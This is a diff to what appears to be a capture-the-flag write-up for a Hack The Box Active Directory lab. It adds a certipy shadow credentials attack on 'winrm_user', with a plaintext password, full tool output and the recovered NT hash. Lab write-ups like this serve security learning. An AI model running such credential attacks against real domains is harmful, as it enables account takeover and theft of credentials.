@@ -571,7 +571,34 @@ The hash did not crack! So ill try a shadow credentials attack
 
 ```python
 faketime -f +7h certipy-ad shadow auto -u 'm.lovegod@absolute.htb' -p 'AbsoluteLDAP2022!' -k -account 'winrm_user' -dc-host dc.absolute.htb -dc-ip 10.129.232.60 -ldap-scheme ldap
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Targeting user 'winrm_user'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '0f8aaee7539f47b0ac41db377e5e473b'
+[*] Adding Key Credential with device ID '0f8aaee7539f47b0ac41db377e5e473b' to the Key Credentials for 'winrm_user'
+[*] Successfully added Key Credential with device ID '0f8aaee7539f47b0ac41db377e5e473b' to the Key Credentials for 'winrm_user'
+[*] Authenticating as 'winrm_user' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_user@absolute.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_user.ccache'
+[*] Wrote credential cache to 'winrm_user.ccache'
+[*] Trying to retrieve NT hash for 'winrm_user'
+[*] Restoring the old Key Credentials for 'winrm_user'
+[*] Successfully restored the old Key Credentials for 'winrm_user'
+[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
 ```
+
+I now have the NTLM hash of the user
+
+
 
 
 
